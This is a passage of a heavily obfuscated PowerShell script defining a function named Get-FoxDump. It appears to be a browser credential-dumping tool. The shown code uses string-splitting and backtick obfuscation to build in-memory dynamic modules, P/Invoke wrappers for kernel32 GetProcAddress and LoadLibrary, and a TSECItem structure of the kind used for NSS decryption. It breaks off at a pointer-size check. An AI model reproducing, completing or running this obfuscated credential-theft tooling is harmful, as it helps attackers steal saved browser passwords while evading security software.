&("{0}{2}{1}" -f 'seT','m','-ItE') ("VaRiAble"+":5u7"+"c"+"1")  (  [TypE]("{1}{0}" -f'uID','g')) ;    ${f`Ah}  =  [TypE]("{5}{7}{1}{3}{0}{2}{6}{4}" -F 'v','iMe.iNTERoPserviCes.CalLI','E','NgCon','n','Run','ntIo','t') ; &("{1}{0}" -f 'M','sET-ItE')  vaRiAble:4mCd ( [Type]("{2}{5}{0}{4}{3}{1}" -F'.InTerOp','RsEt','rUNt','rVICes.cHa','sE','IME'))  ;    &('Sv')  BRh8s (  [TYpe]("{6}{2}{5}{4}{1}{0}{7}{8}{3}"-f'lLImPORTaT','RViCEs.D','untimE','UTe','INTeROpsE','.','r','tri','b') ) ;   &("{2}{1}{0}" -f 'TeM','-i','seT') vaRiaBLE:4rA2u ([tYpe]("{1}{3}{4}{2}{0}"-f 'tE','f','u','LAGsat','Trib')  ) ;    &("{1}{0}"-f 'em','SEt-iT')  ("VARIaBl"+"E"+":QL3Ry") ([typE]("{6}{0}{3}{4}{2}{5}{1}{7}"-F 'Efle','T.PACKiNGsiZ','o','cT','I','n.EMi','R','E')  ); &("{2}{0}{1}" -f'-IT','EM','SEt')  VariABle:RWy ( [TYPe]("{0}{1}{4}{3}{2}"-f 'rEF','LEcTI','ribUTES','tYPeAtT','oN.'))  ;  &("{0}{1}"-f'sE','T-ITeM')  VaRIabLe:m3wl (  [typE]("{3}{4}{0}{1}{2}{5}{7}{6}" -f 'Time.INT','eRoPSErV','iceS.','R','uN','MaRshAla','bUTE','satTrI')  ) ;  &("{0}{1}{2}"-f's','ET-v','aRIaBLe') ('3ED'+'nZ')  ([typE]("{0}{1}"-f'Ty','pE')  ); &('sV')  ("3"+"vO")  (  [tyPE]("{2}{0}{4}{5}{3}{1}"-f 'NT','pSeRVices.mArSHaL','Ru','Ro','Ime.iNt','E'))  ;   &("{0}{1}" -f'SE','t') ('sr'+'F') ([tYpe]("{5}{4}{3}{0}{1}{2}"-f 'n.EmIT','.opc','ODeS','o','cTI','reflE') )  ;&("{2}{1}{0}"-f 'Tem','Et-i','s') vArIaBle:lbZk  (  [typE]("{1}{0}{2}" -F'omA','appD','iN') ); ${w6`LA} =[TypE]("{1}{0}{7}{2}{5}{6}{9}{10}{3}{4}{8}{11}"-f'T','sYS','IoN.','IL','DerA','emiT','.ASseMb','EM.rEFleCt','c','l','ybU','cESs');   ${07`5x}= [tYpe]("{0}{8}{3}{7}{2}{5}{6}{1}{4}{9}" -F'S','.Ca','.rEfLeC','TE','LlI','tI','On','m','Ys','NgcOnVEnTions'); &("{0}{1}" -f 'S','eT') ("H"+"o7KG8")  ([TyPe]("{0}{1}{2}"-f'INt','p','TR') );   &("{0}{1}{2}"-f 'seT-I','te','m') vaRiABle:62PKR1 (  [typE]("{1}{3}{0}{2}"-F 'EXT.eNCod','sys','InG','Tem.T')  )  ;   ${N`I5o} =[tyPE]("{4}{7}{2}{9}{6}{5}{0}{8}{1}{3}"-F 'er','CES.mARSh','Ru','aL','SysTEM','rops','imE.iNte','.','vi','NT') ;Function gEt-`FOX`dump 
{
    

    

    [CmdletBinding()]
    param
    (
        [Parameter(MandAtoRY = ${F`A`Lse})]
        [string]${oUt`F`iLE}

    )
    
    function New`-iNm`eM`OrYmODuLE
  {
    

        Param
        (
            [Parameter(pOSiTIoN = 0)]
            [ValidateNotNullOrEmpty()]
            [String]
            ${Mo`DULE`NA`Me} =  ${5u7`C1}::("{1}{0}"-f'd','NewGui').Invoke().("{0}{1}{2}" -f 'T','oSt','ring').Invoke()
        )

        ${Load`ed`ASSe`MblIeS} =   ( &("{0}{2}{1}"-f 'C','iteM','HILD') VaRIable:LbZK  )."v`AluE"::"currENTD`OmA`In".("{2}{1}{0}"-f'semblies','s','GetA').Invoke()

        foreach (${A`Ss`EMbLY} in ${loa`De`d`Ass`EmBl`IES}) {
            if (${a`sSeMBly}."Fu`LlNa`me" -and (${A`SsemBly}."F`UllNA`Me".("{0}{1}"-f'Sp','lit').Invoke(',')[0] -eq ${modU`LeN`A`Me})) {
                return ${as`SEm`BlY}
            }
        }

        ${dY`NasSeMb`lY} = &("{2}{1}{0}" -f 'ct','w-Obje','Ne') ("{0}{1}{4}{3}{2}" -f'Reflection.A','ssemb','e','am','lyN')(${M`Odu`lENaMe})
        ${Dom`AiN} =  (&("{0}{2}{3}{1}" -f'geT-','E','v','ARiaBl')  ('Lb'+'zk')  )."VAL`Ue"::"CURREn`TDo`MaiN"
        ${ASSeM`Bly`BU`i`LDEr} = ${doM`AIN}.("{3}{2}{4}{0}{1}"-f 'A','ssembly','i','DefineDynam','c').Invoke(${D`YNass`E`mblY}, 'Run')
        ${moDulEB`UIlD`eR} = ${ASSEmBlY`B`U`IlDer}.("{2}{1}{4}{0}{3}" -f 'du','efi','D','le','neDynamicMo').Invoke(${m`OD`Ul`ENAME}, ${FaL`sE})

        return ${mOd`U`leBU`ILdER}
    }


  
  
  function F`Unc
  {
        Param
        (
            [Parameter(PoSitioN = 0, mandAToRY = ${Tr`UE})]
            [String]
            ${dl`L`NAmE},

            [Parameter(PosItioN = 1, mANDATORy = ${tR`Ue})]
            [string]
            ${FUNC`T`iONnA`Me},

            [Parameter(pOSItION = 2, MAndAtorY = ${T`Rue})]
            [Type]
            ${ret`UrNty`pE},

            [Parameter(POSITIoN = 3)]
            [Type[]]
            ${PaR`AMeTe`Rty`P`ES},

            [Parameter(PoSitioN = 4)]
            [Runtime.InteropServices.CallingConvention]
            ${nATiVECALl`INgCo`N`VE`N`Ti`On},

            [Parameter(pOSItion = 5)]
            [Runtime.InteropServices.CharSet]
            ${CHaR`S`eT},

            [Switch]
            ${s`etLAsTeR`R`Or}
        )

        ${pRop`Ert`ieS} = @{
            ("{1}{0}{2}" -f'am','DllN','e') = ${dL`lN`AmE}
            ("{0}{2}{1}{3}"-f'Funct','n','io','Name') = ${f`UnctIonn`AmE}
            ("{0}{1}{3}{2}"-f 'Re','turnTy','e','p') = ${rE`TurN`Ty`pE}
        }

        if (${Par`A`meTertYp`es}) { ${P`ROPeRT`iEs}[("{1}{4}{2}{3}{0}"-f 'pes','Para','eterT','y','m')] = ${PARa`ME`Ter`TYPes} }
        if (${nA`TiVecal`L`Ingc`O`NVEnt`IOn}) { ${pRop`ERtI`Es}[("{0}{5}{1}{4}{2}{6}{3}"-f'Nati','alli','ent','on','ngConv','veC','i')] = ${N`A`TIV`E`CAlL`In`gConVENtIon} }
        if (${C`haR`SET}) { ${PR`oPe`Rties}[("{1}{0}{2}" -f 'a','Ch','rset')] = ${ChAR`S`ET} }
        if (${SetlaST`ER`RoR}) { ${Pro`Per`TiES}[("{0}{3}{2}{1}"-f 'Se','r','tErro','tLas')] = ${SeT`laS`TERror} }

        &("{1}{2}{3}{0}"-f 't','New-O','bje','c') ("{1}{0}{2}" -f'SObjec','P','t') -Property ${PROpe`R`T`IES}
    }


  function A`dd-`WI`N32Type
  {
    

        [OutputType([Hashtable])]
        Param(
            [Parameter(MANdatORY = ${tr`Ue}, VALUeFROMPiPEliNEByproPertYname = ${tR`UE})]
            [String]
            ${dLl`NAme},

            [Parameter(mANdatORY = ${tR`Ue}, vAluefrOmPipElIneBYprOperTyNaME = ${t`RuE})]
            [String]
            ${f`U`Nctio`N`NAMe},

            [Parameter(mAndAtORY = ${t`RUE}, ValUeFrOMpIpelINeByPropErtynaMe = ${tr`Ue})]
            [Type]
            ${Re`TurNT`YPE},

            [Parameter(valUEFrOMpipELinebYPropErTyNaME = ${TR`Ue})]
            [Type[]]
            ${P`ARamEteRTY`p`eS},

            [Parameter(vALUEfRoMPIPelInEbypROperTYnAme = ${t`RuE})]
            [Runtime.InteropServices.CallingConvention]
            ${N`ATiV`ecaLlINGc`oNv`ENTi`on} =   (  &("{2}{0}{1}" -f 'A','rIaBle','gET-v') ("FA"+"H")  -VALUEo )::"STDca`lL",

            [Parameter(valUefroMpiPelInEbYPROpErtYNAME = ${t`RUE})]
            [Runtime.InteropServices.CharSet]
            ${CHarS`ET} =   (&('gi') VArIABlE:4Mcd )."vaL`Ue"::"AU`TO",

            [Parameter(vaLuEfrompIPELInebypropERTynaME = ${T`RUe})]
            [Switch]
            ${SeT`lAS`TERRor},

            [Parameter(maNdAToRY = ${t`RUe})]
            [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
            ${M`Odule},

            [ValidateNotNull()]
            [String]
            ${NA`me`sPacE} = ''
        )

        BEGIN
        {
            ${TY`peH`A`sh} = @{}
        }

        PROCESS
        {
            if (${mO`D`Ule} -is [Reflection.Assembly])
            {
                if (${naM`e`SpAcE})
                {
                    ${typ`E`hA`sh}[${DLl`N`AME}] = ${M`odu`LE}.("{2}{0}{1}"-f 'tT','ype','Ge').Invoke("$Namespace.$DllName")
                }
                else
                {
                    ${tY`PEh`ASH}[${DLl`NAmE}] = ${m`od`ULe}.("{0}{2}{1}" -f'GetT','e','yp').Invoke(${DlL`Na`ME})
                }
            }
            else
            {
                
                if (!${T`ypEH`A`sh}.("{0}{1}{2}{3}"-f'Contains','K','e','y').Invoke(${Dl`Ln`AME}))
                {
                    if (${nAMesp`A`ce})
                    {
                        ${t`ypEhASH}[${Dl`L`NaMe}] = ${MOdu`Le}.("{3}{2}{0}{1}"-f'Ty','pe','ne','Defi').Invoke("$Namespace.$DllName", ("{3}{4}{2}{5}{1}{0}"-f'nit','reFieldI','i','Pub','l','c,Befo'))
                    }
                    else
                    {
                        ${ty`p`eHash}[${dLl`Na`me}] = ${m`odule}.("{2}{0}{1}"-f 'fine','Type','De').Invoke(${dll`N`Ame}, ("{2}{3}{1}{4}{0}" -f 't','Befo','Pub','lic,','reFieldIni'))
                    }
                }

                ${MEt`h`od} = ${TYPe`hASH}[${D`lLnaMe}].("{3}{0}{2}{1}"-f 'neMe','hod','t','Defi').Invoke(
                    ${f`UN`ct`io`NnAMe},
                    ("{6}{4}{0}{1}{5}{2}{7}{3}" -f'c',',St','ic,Pinvoke','mpl','ubli','at','P','I'),
                    ${reT`UR`NtYPE},
                    ${p`ArA`mE`TERTYpeS})

                
                ${I} = 1
                foreach(${pAram`E`TER} in ${pA`Rame`Te`RTY`PEs})
                {
                    if (${P`AR`AmeTEr}."Is`B`yref")
                    {
                        [void] ${mE`TH`OD}.("{0}{2}{1}{3}" -f 'De','met','finePara','er').Invoke(${i}, 'Out', ${n`Ull})
                    }

                    ${i}++
                }

                ${dLL`IMP`ort} = [Runtime.InteropServices.DllImportAttribute]
                ${SEt`L`ASter`ROrfiE`LD} = ${DL`L`i`mPOrT}.("{1}{0}"-f 'etField','G').Invoke(("{3}{1}{0}{2}" -f 'astErr','tL','or','Se'))
                ${CALLi`NG`Co`NvEnt`IoNFIELD} = ${DlLImP`o`RT}.("{1}{0}" -f'etField','G').Invoke(("{3}{1}{2}{0}"-f 'on','n','ti','CallingConve'))
                ${Cha`R`SE`TFIELd} = ${dL`li`Mpo`Rt}.("{1}{0}{2}"-f 'Fi','Get','eld').Invoke(("{0}{1}"-f'CharSe','t'))
                if (${SETL`AsTE`Rr`or}) { ${SL`E`ValUe} = ${tr`UE} } else { ${SL`E`ValUe} = ${F`ALSE} }

                
                ${cON`STRu`C`ToR} =  ${b`RH8s}."GETCoNsT`RUCt`Or"([String])
                ${D`LLIMp`ORt`A`TTrIBU`TE} = &("{2}{1}{0}" -f'Object','w-','Ne') ("{8}{1}{9}{2}{7}{4}{3}{5}{0}{6}" -f'ui','e','ion.Emit.','i','stomAttr','buteB','lder','Cu','Refl','ct')(${coN`StruC`T`Or},
                    ${dL`lNamE}, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                    [Reflection.FieldInfo[]] @(${s`eTlAsterRo`Rf`IElD}, ${CaLLInG`C`ON`Ven`TIoN`Fi`ELD}, ${cH`Ar`setfI`ElD}),
                    [Object[]] @(${s`lEvAl`Ue}, ([Runtime.InteropServices.CallingConvention] ${NATivE`callin`gc`ONv`ENTI`ON}), ([Runtime.InteropServices.CharSet] ${c`hARS`ET})))

                ${m`et`hOd}.("{3}{0}{2}{4}{1}"-f 'ust','tribute','om','SetC','At').Invoke(${DlLIMpO`RTa`T`TRIBUTe})
            }
        }

        END
        {
            if (${MO`Du`le} -is [Reflection.Assembly])
            {
                return ${tY`Pe`h`ASH}
            }

            ${REtU`R`NtYp`eS} = @{}

            foreach (${K`eY} in ${tyPE`HA`sh}."KE`ys")
            {
                ${ty`Pe} = ${tyPe`hash}[${K`Ey}].("{2}{1}{3}{0}" -f'pe','T','Create','y').Invoke()
            
                ${rEtUR`NTY`p`Es}[${k`eY}] = ${T`YPE}
            }

            return ${r`etuR`Nt`YpES}
        }
    }


  function P`s`enum
  {
    

        [OutputType([Type])]
        Param
        (
            [Parameter(PoSItIon = 0, mAnDaTory = ${TR`UE})]
            [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
            ${m`Od`ULe},

            [Parameter(pOSitIOn = 1, mAndAtorY = ${TR`UE})]
            [ValidateNotNullOrEmpty()]
            [String]
            ${fuLlnA`Me},

            [Parameter(posiTION = 2, manDAtORY = ${TR`UE})]
            [Type]
            ${ty`PE},

            [Parameter(pOsITion = 3, MaNDATOry = ${T`RuE})]
            [ValidateNotNullOrEmpty()]
            [Hashtable]
            ${E`N`Um`ElemENTs},

            [Switch]
            ${B`iTfi`E`Ld}
        )

        if (${mod`U`Le} -is [Reflection.Assembly])
        {
            return (${m`odu`le}.("{0}{1}"-f'Ge','tType').Invoke(${f`U`L`LNAME}))
        }

        ${ENu`M`TYPE} = ${T`YpE} -as [Type]

        ${e`NumBu`ilD`Er} = ${MoDU`LE}.("{3}{2}{0}{1}"-f'eE','num','n','Defi').Invoke(${FulL`NAMe}, ("{0}{1}"-f 'Pu','blic'), ${ENum`TYpe})

        if (${bit`FI`ELD})
        {
            ${flAgScONsT`R`U`ctor} =   (&("{0}{2}{1}" -f 'ChI','teM','Ldi') VAriABle:4rA2u )."V`AlUe"."geTCONs`Tr`U`cTOr"(@())
            ${F`LagScU`S`TOMATt`RiBUte} = &("{0}{2}{1}"-f 'New-O','ect','bj') ("{2}{1}{5}{8}{11}{9}{3}{6}{0}{7}{10}{4}"-f 'trib','e','Refl','A','uilder','ct','t','u','ion.Emit','m','teB','.Custo')(${fl`AGs`COnS`T`RucT`Or}, @())
            ${e`NU`MBui`LdEr}.("{0}{4}{3}{1}{2}"-f 'S','but','e','i','etCustomAttr').Invoke(${FLagScusToma`T`TR`IB`UtE})
        }

        foreach (${K`eY} in ${EN`UM`elemEnts}."k`eYs")
        {
            
            ${N`UlL} = ${ENumBu`I`LDer}."DEFIn`el`iTER`AL"(${k`EY}, ${eNu`M`ElEmEn`Ts}[${k`Ey}] -as ${eNumT`y`pE})
        }

        ${enUMBU`I`LD`eR}.("{0}{1}{2}"-f'Cre','at','eType').Invoke()
    }


  
  
  function FiE`ld
  {
        Param
        (
            [Parameter(PoSITiON = 0, mANDATORy = ${t`RUE})]
            [UInt16]
            ${p`oSitioN},
        
            [Parameter(pOSiTioN = 1, MaNDATORy = ${tR`Ue})]
            [Type]
            ${T`yPE},
        
            [Parameter(PosITIOn = 2)]
            [UInt16]
            ${Of`FsET},
        
            [Object[]]
            ${mar`sha`laS}
        )

        @{
            pOsITIoN = ${POs`i`Tion}
            ("{0}{1}"-f'Typ','e') = ${ty`Pe} -as [Type]
            ("{0}{2}{1}" -f 'O','et','ffs') = ${o`FFs`Et}
            ("{1}{0}"-f'rshalAs','Ma') = ${Ma`RShAL`AS}
        }
    }


  function StRU`cT
  {
        

        [OutputType([Type])]
        Param
        (
            [Parameter(positiOn = 1, MaNdAtoRy = ${tR`UE})]
            [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
            ${MO`Du`lE},

            [Parameter(posITIOn = 2, ManDatory = ${tr`UE})]
            [ValidateNotNullOrEmpty()]
            [String]
            ${FU`LL`NAME},

            [Parameter(pOsiTioN = 3, MaNDATOrY = ${tr`Ue})]
            [ValidateNotNullOrEmpty()]
            [Hashtable]
            ${st`RUC`TFiELds},

            [Reflection.Emit.PackingSize]
            ${P`A`CKI`NGsiZE} =   (&("{0}{1}" -f'ItE','m')  ("vaRIABL"+"e"+":QL3ry"))."VaL`UE"::"UNs`Pec`iF`iED",

            [Switch]
            ${EX`Pl`Ic`itlA`YOUT}
        )

        if (${mo`DUle} -is [Reflection.Assembly])
        {
            return (${mOd`Ule}.("{0}{2}{1}"-f'G','Type','et').Invoke(${FUL`L`Name}))
        }

        [Reflection.TypeAttributes] ${s`TrUC`TA`TtRIB`UTES} = ("{18}{14}{6}{11}{15}{8}{10}{19}{0}{1}{16}{12}{13}{17}{5}{2}{4}{3}{7}{9}" -f'    ',' ','ed,
   ','        B',' ','al','s,','eforeF','  Class,
','ieldInit',' ','
   ','li','c,
            ','las','       ','  Pub','Se','AnsiC','    ')

        if (${EXPLi`cI`TlaYo`UT})
        {
            ${s`TruC`TatT`RibuTEs} = ${strucT`A`T`TrIbU`TeS} -bor  (  &("{0}{1}{2}{3}" -f 'Ge','t-','VarIabL','E')  RwY )."vA`Lue"::"Expl`ICIT`lAYo`UT"
        }
        else
        {
            ${sT`RuCtA`TT`R`iB`UTES} = ${st`RUc`TA`TT`Ri`BUTEs} -bor   ( &("{0}{1}" -f'g','cI') vARiAbLE:RWY)."val`UE"::"Seq`UeNTIa`LLa`yo`UT"
        }

        ${StR`Uc`T`BUILDER} = ${M`o`DULE}."DeFI`Ne`TYpE"(${FU`llNa`mE}, ${STRUC`TAtt`R`ib`Utes}, [ValueType], ${PA`CK`I`NgSiZE})
        ${con`StRUCT`o`Ri`NFO} =  (  &("{1}{0}{2}"-f 'et-CHild','G','ItEM')  VARIaBle:M3wl )."va`luE".("{1}{2}{3}{0}"-f'ors','GetConst','ruc','t').Invoke()[0]
        ${Si`Ze`conSt} = @( ( &("{1}{0}{2}" -f'T-CH','GE','iLDItEm')  VArIabLE:m3Wl )."vA`LUE".("{0}{2}{1}" -f 'G','ield','etF').Invoke(("{1}{0}{2}"-f'zeCon','Si','st')))

        ${FI`El`dS} = &("{0}{1}{3}{2}" -f'N','e','bject','w-O') ("{2}{1}{0}" -f'table[]','h','Has')(${s`Tr`Uc`TfieldS}."CO`UnT")

        
        
        
        foreach (${F`ie`LD} in ${S`TrUct`FIE`LdS}."K`eys")
        {
            ${InD`EX} = ${STruct`FI`eLdS}[${fi`ELD}][("{1}{0}" -f 'n','Positio')]
            ${fIE`lDs}[${I`Ndex}] = @{("{1}{0}{2}" -f 'ield','F','Name') = ${FIE`Ld}; ("{2}{0}{1}"-f'ie','s','Propert') = ${sTRUcTf`iE`l`ds}[${F`i`eLD}]}
        }

        foreach (${f`iE`Ld} in ${fie`LDs})
        {
            ${Fi`ELd`N`Ame} = ${fi`e`LD}[("{1}{0}{2}"-f 'eldNa','Fi','me')]
            ${F`iE`LDPRop} = ${F`ie`ld}[("{0}{2}{1}" -f 'Pr','ties','oper')]

            ${Of`F`Set} = ${FiEl`dP`ROp}[("{0}{1}" -f 'Offs','et')]
            ${Ty`pE} = ${f`ielDPr`OP}[("{1}{0}" -f'e','Typ')]
            ${mArs`H`ALaS} = ${fIE`Ld`PRop}[("{0}{1}{2}" -f'Ma','rsha','lAs')]

            ${NEWF`i`Eld} = ${S`Tr`UCTb`UI`LDER}.("{1}{2}{0}" -f'eField','Defi','n').Invoke(${f`ieL`dNaMe}, ${T`yPe}, ("{1}{0}" -f'c','Publi'))

            if (${Ma`RSha`las})
            {
                ${U`NmA`NAGe`dtype} = ${maR`s`hALaS}[0] -as ([Runtime.InteropServices.UnmanagedType])
                if (${MArsHA`L`As}[1])
                {
                    ${s`IZe} = ${ma`RS`H`Alas}[1]
                    ${aTTr`ibBu`ildeR} = &("{0}{1}{2}" -f'Ne','w-Obje','ct') ("{8}{5}{9}{7}{4}{0}{2}{3}{6}{1}"-f 'tribu','er','teBu','il','At','ion.Emit','d','stom','Reflect','.Cu')(${cOn`STrU`C`T`OrinFo},
                        ${UN`maNag`Ed`T`ype}, ${S`iZe`co`NST}, @(${s`Ize}))
                }
                else
                {
                    ${aTt`Ribbu`I`LDEr} = &("{0}{1}{2}"-f 'N','ew-Ob','ject') ("{3}{9}{8}{5}{1}{6}{2}{4}{10}{7}{0}"-f 'er','ustom','ibute','Refle','B','C','Attr','ild','Emit.','ction.','u')(${Cons`TRu`CtO`R`inFo}, [Object[]] @(${uNMA`N`A`gED`TyPe}))
                }
            
                ${n`ewfI`Eld}.("{4}{0}{3}{2}{1}"-f 'tC','te','omAttribu','ust','Se').Invoke(${AT`TR`I`B`BuILDeR})
            }

            if (${EXPLic`iTL`Ay`oUT}) { ${NeW`F`iELD}.("{0}{1}"-f 'Se','tOffset').Invoke(${o`FfSeT}) }
        }

        
        
        ${SI`ze`mETHod} = ${sTR`Uct`BUilD`eR}.("{2}{0}{1}{3}"-f 'eM','e','Defin','thod').Invoke(("{1}{0}"-f'e','GetSiz'),
            ("{3}{2}{1}{0}"-f'c',' Stati','ublic,','P'),
            [Int],
            [Type[]] @())
        ${ilg`e`N`ERaToR} = ${s`i`zEmEtHoD}.("{2}{3}{1}{0}"-f'tor','nera','G','etILGe').Invoke()
        
        ${il`GeN`ERatoR}.("{1}{0}"-f 'it','Em').Invoke( ( &("{0}{1}{2}"-f'VaRIa','b','lE')  ("SR"+"F"))."V`AlUE"::"Ldtok`eN", ${str`Uc`TB`UILdER})
        ${ILGe`NERa`T`or}.("{1}{0}"-f'mit','E').Invoke(  ( &('ls') ('vArIA'+'BlE:'+'s'+'rF'))."v`AlUE"::"Ca`Ll",
              (&("{0}{2}{3}{1}"-f 'gE','IaBLE','t-v','aR') 3EDNz)."v`Alue".("{1}{2}{0}" -f 'tMethod','G','e').Invoke(("{2}{3}{0}{1}{4}{5}"-f 'a','nd','GetTypeF','romH','l','e')))
        ${iLGeN`e`Ra`Tor}.("{0}{1}"-f 'E','mit').Invoke( ( &('gI')  vAriAbLe:Srf )."vA`luE"::"Ca`lL",
             ( &('GI') vAriAbLE:3Vo  )."V`ALUE".("{1}{0}{2}" -f 'etMe','G','thod').Invoke(("{0}{1}"-f 'S','izeOf'), [Type[]] @([Type])))
        ${iLGEne`Ra`T`oR}.("{0}{1}"-f'Emi','t').Invoke(  ${s`RF}::"r`eT")

        
        
        ${iMp`L`ic`I`TC`ONVeRtEr} = ${StRu`Ct`BUIL`DeR}.("{3}{2}{0}{1}" -f'neMe','thod','fi','De').Invoke(("{2}{1}{3}{0}"-f 't','Impli','op_','ci'),
            ("{2}{0}{11}{6}{4}{8}{1}{5}{7}{9}{10}{3}"-f 'v','Sta','Pri','me',',','tic, HideBy','eScope, Public','Sig,',' ',' SpecialN','a','at'),
            ${St`RUcTbu`i`LDer},
            [Type[]] @([IntPtr]))
        ${il`g`EnErAto`R2} = ${ImplICi`Tc`O`NvERtER}.("{2}{1}{3}{0}" -f'ator','Ge','GetIL','ner').Invoke()
        ${ilGeNe`R`AT`O`R2}.("{1}{0}" -f't','Emi').Invoke(  (&("{0}{1}{2}" -f 'V','A','riablE') sRf  -vAlue )::"N`oP")
        ${i`lgEN`er`AtOR2}.("{0}{1}" -f'Em','it').Invoke( ${s`Rf}::"lDAr`g_0")
        ${ilGEN`E`RaTo`R2}.("{1}{0}"-f 'it','Em').Invoke(  (&('GI')  ("v"+"a"+"rIabLE:SRF") )."VAL`UE"::"lDt`O`ken", ${sTrUCt`BU`Ilder})
        ${ILGe`N`erATOR2}.("{1}{0}" -f 't','Emi').Invoke(  ${S`Rf}::"C`ALl",
              (&("{0}{1}" -f'DI','R') ('vAri'+'AbLe:'+'3E'+'DnZ')  )."va`LuE".("{1}{2}{0}" -f'od','Ge','tMeth').Invoke(("{2}{3}{0}{1}{4}" -f 'Fro','mH','GetTyp','e','andle')))
        ${IlG`e`N`ERaTo`R2}.("{0}{1}" -f 'Emi','t').Invoke(  (  &("{1}{0}{2}" -f'DiT','CHil','EM') VariAblE:SrF)."vaL`UE"::"c`ALL",
              (  &("{1}{0}"-f'cI','g') ("VaRI"+"Able:3"+"vO")  )."v`ALuE".("{0}{1}" -f'GetMet','hod').Invoke(("{2}{4}{3}{0}{1}"-f 'r','e','PtrToS','ctu','tru'), [Type[]] @([IntPtr], [Type])))
        ${ilGENe`Ra`To`R2}.("{1}{0}" -f't','Emi').Invoke( (  &("{1}{0}{2}" -f'iAb','VaR','lE') srF )."V`AlUE"::"UN`B`oX_any", ${st`Ruc`TB`UildER})
        ${ILge`NE`RATOr2}.("{1}{0}"-f't','Emi').Invoke( (&('Gi') ('VariA'+'BL'+'E:'+'Srf'))."vA`luE"::"r`eT")

        ${sT`R`UC`TBUiL`DER}.("{1}{2}{0}" -f'Type','C','reate').Invoke()
    }
    

    

    
   
    
    Function get-`D`eleGATE`TYPE
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( posItion = 0)]
            [Type[]]
            ${p`A`RaMetErs} = (&("{2}{3}{1}{0}"-f 'bject','w-O','N','e') ("{1}{0}" -f'pe[]','Ty')(0)),
            
            [Parameter( PoSItIon = 1 )]
            [Type]
            ${r`Etu`R`NtypE} = [Void]
        )

        ${d`omA`iN} =  (&("{2}{0}{3}{1}"-f 'et','AbLe','g','-VARi') Lbzk -vaLU)::"c`URRen`Td`o`maiN"
        ${DY`NasSeM`BLY} = &("{1}{2}{0}"-f'ct','New-','Obje') ("{4}{1}{0}{3}{2}"-f 'stem.Reflection.Assemb','y','Name','ly','S')(("{0}{2}{4}{1}{3}" -f'R','t','eflect','e','edDelega'))
        ${A`SSembL`yBUilDeR} = ${dom`AIN}.("{4}{2}{6}{3}{0}{5}{1}"-f 'cAssemb','y','i','nami','Def','l','neDy').Invoke(${dY`Na`s`sEmBLy},   ${W6`La}::"r`UN")
        ${M`OdUlE`BUI`LdeR} = ${a`s`seMBlY`BUilDEr}.("{1}{0}{3}{2}{4}"-f 'neD','Defi','micModu','yna','le').Invoke(("{2}{0}{3}{1}"-f 'n','e','I','MemoryModul'), ${FA`Lse})
        ${Typ`e`BU`ILDEr} = ${MOD`UL`ebui`lD`ER}.("{0}{1}{2}" -f'Defin','eT','ype').Invoke(("{2}{3}{0}{1}"-f 'egateT','ype','M','yDel'), ("{8}{3}{10}{2}{0}{1}{7}{4}{9}{5}{6}" -f 'eal','ed,','ublic, S','las','Ans','uto','Class',' ','C','iClass, A','s, P'), [System.MulticastDelegate])
        ${co`NStRu`ctoRB`UildER} = ${Ty`Pebu`iLDEr}.("{4}{1}{2}{0}{3}"-f'nstruc','i','neCo','tor','Def').Invoke(("{5}{0}{6}{1}{3}{2}{4}" -f'e','ialName, ','deBySig, P','Hi','ublic','RTSp','c'),   ${0`75x}::"STAnd`ArD", ${PAr`AmeT`eRs})
        ${coNS`Tru`c`TOrBuildeR}.("{2}{3}{4}{1}{0}" -f 'tationFlags','emen','SetI','mp','l').Invoke(("{0}{1}{2}{3}{4}" -f'Ru','n','time',',',' Managed'))
        ${mE`TH`OD`BUIl`deR} = ${TY`Pe`BUI`LDer}.("{1}{0}{2}" -f'h','DefineMet','od').Invoke('Invoke', ("{8}{7}{4}{3}{6}{1}{5}{2}{0}" -f 't, Virtual',' Ne','lo','eByS','Hid','wS','ig,',' ','Public,'), ${R`etuR`NTY`pe}, ${pAr`AME`TE`RS})
        ${metH`ODBuIL`D`eR}.("{1}{2}{3}{0}"-f'nFlags','SetIm','plementati','o').Invoke(("{2}{3}{1}{0}{4}" -f 'g','na','R','untime, Ma','ed'))
        
        &("{3}{2}{0}{1}" -f'ite-Outp','ut','r','W') ${ty`peBUI`LD`eR}.("{3}{0}{1}{2}"-f 'reat','e','Type','C').Invoke()
    }


    ${m`OD} = &("{4}{3}{2}{0}{1}"-f 'odul','e','moryM','InMe','New-') -ModuleName ("{0}{1}"-f 'Win3','2')

    ${fUnCtI`ONDEfiNI`TIo`Ns} = @(
        (&("{0}{1}"-f'f','unc') ("{1}{2}{0}" -f '32','kern','el') ("{3}{1}{0}{2}" -f'dre','rocAd','ss','GetP') ([IntPtr]) @([IntPtr], [string]) -Charset ("{1}{0}" -f'si','An') -SetLastError),
        (&("{1}{0}" -f'c','fun') ("{0}{2}{1}"-f 'k','32','ernel') ("{2}{1}{0}" -f'rary','oadLib','L') ([IntPtr]) @([string]) -Charset ("{1}{0}"-f 'si','An') -SetLastError),
        (&("{1}{0}" -f'nc','fu') ("{0}{1}{2}"-f'ke','r','nel32') ("{0}{2}{1}" -f'Fr','eLibrary','e') ([Bool]) @([IntPtr]) -Charset ("{0}{1}"-f 'A','nsi') -SetLastError)
    )

    ${TS`eC`IteM} = &("{0}{1}"-f 'struc','t') ${M`Od} ("{0}{2}{1}"-f'TSE','m','CIte') @{
        ("{0}{2}{1}" -f'S','Type','ECItem')    =    &("{0}{1}"-f'fie','ld') 0 ("{1}{0}"-f'nt','I')
        ("{3}{2}{0}{1}"-f'temDa','ta','I','SEC')    =    &("{0}{1}" -f'fiel','d') 1 ("{0}{1}"-f'I','nt')
        ("{0}{1}{2}" -f'S','ECItem','Len')     =    &("{0}{1}" -f'fi','eld') 2 ("{1}{0}"-f't','In')
    }

    ${t`YPes} = ${FUnctI`ONDeF`INITi`o`Ns} | &("{1}{2}{0}{3}"-f '2Typ','Add','-Win3','e') -Module ${M`oD} -Namespace ("{0}{1}" -f 'Win3','2')
    ${kE`RNel`32} = ${T`ypEs}[("{0}{1}{2}" -f'k','er','nel32')]
    
    ${n`sS`dLlhAnDLe} =  ${Ho7`K`G8}::"Z`ero"

    if(  ${h`o7`Kg8}::"sI`Ze" -eq 8)
    {
